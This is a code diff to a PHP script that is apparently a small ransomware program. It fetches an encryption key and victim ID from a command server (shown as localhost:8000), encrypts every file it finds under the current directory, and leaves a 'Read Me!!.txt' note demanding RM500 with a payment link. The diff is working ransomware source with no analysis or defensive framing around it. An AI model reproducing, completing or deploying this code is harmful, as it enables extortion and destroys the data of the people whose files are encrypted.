@@ -3,16 +3,33 @@ error_reporting(0);
 echo 'Starting to encrypt. <br><br>';
 
 //retrieve $key from server
-$key = 'bRuD5WYw5wd0rdHR9yLlM6wt2vteuiniQBqE70nAuhU=';
+$key = '';
 
 //server send ID and save it in txt file
 $id = '';
+$url = 'http://localhost:8000/api/';
+$link_to_pay = 'http://localhost:8000/toyib/gateway.php';
 
+if($response = file_get_contents($url . 'key'))
+{
+    $res = json_decode($response);
+    $key = $res->key;
+    $id = $res->id;
+}
+
+//do encryption process
 $countFile = 0;
 $dir    = './';
 findFileInFolder($dir, $countFile, $key);
 
 echo '<hr>Total encrypted file is : ' . $countFile;
+
+//output a text file
+$message = "Good news! You can retrieve your file!\nMust pay RM500 to us.\n\nID: " . $id . "\n\nPay not at " . $link_to_pay . ".";
+$filename = "Read Me!!.txt";
+
+//write the message to the file
+file_put_contents($filename, $message);
 
 function findFileInFolder($dir, &$countFile, $key)
 {
